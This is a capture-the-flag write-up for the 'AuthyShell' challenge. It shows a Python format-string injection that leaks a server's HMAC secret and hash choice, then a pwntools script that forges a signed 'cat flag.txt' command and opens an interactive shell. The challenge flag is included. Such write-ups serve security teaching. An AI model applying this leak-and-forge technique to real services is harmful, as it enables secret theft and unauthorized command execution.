# AuthyShell 
——————— 𝘼𝙪𝙩𝙝𝙤𝙧 𝙣𝙤𝙩𝙚 ———————<br>
𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲’𝘀 𝗻𝗮𝗺𝗲: AuthyShell<br>
𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆: Misc<br>
𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻: You shall not pass without<br>
knowing my secret signing key!<br>
Target: 138.68.101.239:6666 <br>
Note: no brute-forcing is required.<br>
———————————————————————<br>
```
$ nc 138.68.101.239 6666
  ______               __      __                         ______   __                  __  __
 /      \             |  \    |  \                       /      \ |  \                |  \|  \
|  $$$$$$\ __    __  _| $$_   | $$____   __    __       |  $$$$$$\| $$____    ______  | $$| $$
| $$__| $$|  \  |  \|   $$ \  | $$    \ |  \  |  \      | $$___\$$| $$    \  /      \ | $$| $$
| $$    $$| $$  | $$ \$$$$$$  | $$$$$$$\| $$  | $$       \$$    \ | $$$$$$$\|  $$$$$$\| $$| $$
| $$$$$$$$| $$  | $$  | $$ __ | $$  | $$| $$  | $$       _\$$$$$$\| $$  | $$| $$    $$| $$| $$
| $$  | $$| $$__/ $$  | $$|  \| $$  | $$| $$__/ $$      |  \__| $$| $$  | $$| $$$$$$$$| $$| $$
| $$  | $$ \$$    $$   \$$  $$| $$  | $$ \$$    $$       \$$    $$| $$  | $$ \$$     \| $$| $$
 \$$   \$$  \$$$$$$     \$$$$  \$$   \$$ _\$$$$$$$        \$$$$$$  \$$   \$$  \$$$$$$$ \$$ \$$
                                        |  \__| $$
                                         \$$    $$  Made with love using Python
                                          \$$$$$$

[1]. Execute shell command
[2]. Customize shell prompt
[0]. Terminate session

>>> 1
[May 14 14:07:16] ~> authy-1.0.0$ ls
✍  Signature: ls
❌ Invalid signature

[1]. Execute shell command
[2]. Customize shell prompt
[0]. Terminate session

>>> 2
New prompt template: {0.__init__}, {1.__init__}

[1]. Execute shell command
[2]. Customize shell prompt
[0]. Terminate session

>>> 1
<method-wrapper '__init__' of str object at 0x7f6bd120af70>, <bound method ShellPrompt.__init__ of <__main__.ShellPrompt object at 0x7f6bd12dc5c0>>
```
The customize shell seems to be using format() method with two arguments, but it's not escaping our input string<br>
We can use attributes to leak the global variables<br>
```
>>> 2
New prompt template: {1.__init__.__globals__}

[1]. Execute shell command
[2]. Customize shell prompt
[0]. Terminate session

>>> 1
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 
0x7f350d095a20>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/challenge/authyshell.py',
'__cached__': None, 'datetime': <class 'datetime.datetime'>, 'subprocess': <module 'subprocess' from '/usr/lib/python3.6/subprocess.py'>,
'hmac': <module 'hmac' from '/usr/lib/python3.6/hmac.py'>, 'os': <module 'os' from '/usr/lib/python3.6/os.py'>, 
'SECRET': b'\xd7p\xbb.\x03c\xc9\xb9R/O.\xd5\x1e2\x13\x1dckBt\x17\x8b\x85\\r\xc3\x87\xdfv\xb7$',
'BANNER': '  ______               __      __                         ______   __                  __  __ \n /      \\             |  \\    |  \\                       /      \\ |  \\                |  \\|  \\\n|  $$$$$$\\ __    __  _| $$_   | $$____   __    __       |  $$$$$$\\| $$____    ______  | $$| $$\n| $$__| $$|  \\  |  \\|   $$ \\  | $$    \\ |  \\  |  \\      | $$___\\$$| $$    \\  /      \\ | $$| $$\n| $$    $$| $$  | $$ \\$$$$$$  | $$$$$$$\\| $$  | $$       \\$$    \\ | $$$$$$$\\|  $$$$$$\\| $$| $$\n| $$$$$$$$| $$  | $$  | $$ __ | $$  | $$| $$  | $$       _\\$$$$$$\\| $$  | $$| $$    $$| $$| $$\n| $$  | $$| $$__/ $$  | $$|  \\| $$  | $$| $$__/ $$      |  \\__| $$| $$  | $$| $$$$$$$$| $$| $$\n| $$  | $$ \\$$    $$
\\$$  $$| $$  | $$ \\$$    $$       \\$$    $$| $$  | $$ \\$$     \\| $$| $$\n \\$$   \\$$  \\$$$$$$     \\$$$$  \\$$   \\$$ _\\$$$$$$$        \\$$$$$$  \\$$   \\$$  \\$$$$$$$ \\$$ \\$$\n                                        |  \\__| $$\n                                         \\$$    $$  Made with love using Python\n                                          \\$$$$$$', 
'MENU': '\n[1]. Execute shell command\n[2]. Customize shell prompt\n[0]. Terminate session\n', 'SHELL': 'authy-1.0.0', 'DEFAULT_PROMPT_TMPL': '[{}] ~> {}',
'ShellPrompt': <class '__main__.ShellPrompt'>, 'verify_signature': <function verify_signature at 0x7f350d0b9e18>, 'main': <function main at 0x7f350ce3eae8>}
```
We leaked the SECRET and we notice the hmac module is imported for signing the command, we also notice<br>
'vefiry_signature' function. We still need to know which hashing fucntion is used, so we try to leak local variables from verify_signature<br>
```
>>> 2
New prompt template: {1.__init__.__globals__[verify_signature].__code__.co_consts}

[1]. Execute shell command
[2]. Customize shell prompt
[0]. Terminate session

>>> 1
(None, 'sha256')
```
Now we have the hmac secret and the hash function name, all we need to do is sign the commands send it with the signature
```python
from pwn import *
from ast import literal_eval
import hmac

attribute = '{1.__init__.__func__.__globals__[SECRET]}'
cmd = b'cat flag.txt'

def parse(sec):
    i = 2
    parsed = ''
    while i < len(sec)-1:
        if sec[i:i+2] == '\\x':
            parsed += sec[i+2:i+4]
            i += 4
        else:
            parsed += f'{format(ord(sec[i]), "02x")}'
            i += 1
    return parsed

def main():
    r = remote("138.68.101.239", 6666)
    r.sendlineafter('>>> ', '2')
    r.sendlineafter('New prompt template: ', attribute)

    r.sendlineafter('>>> ', b'1\n'+cmd)
    r.recvuntil("'")
    secret = r.recvuntil("'", drop=True)
    secret = literal_eval(f'"{secret}"')
    secret = parse(secret)
    log.info(f'Leaked SECRET : {secret}')
    binary_secret = binascii.a2b_hex(secret)

    signature = hmac.new(binary_secret, cmd, hashlib.sha256).hexdigest()
    log.info(f'HMAC Signature : {signature}')

    r.sendline(signature)
    r.sendline('exec >&2')
    r.interactive()
```

# Flag
```
shellmates{str1ng_f0rm4tt1ng_vulns_ex1st_1n_pyth0n_as_w3ll?!}
```

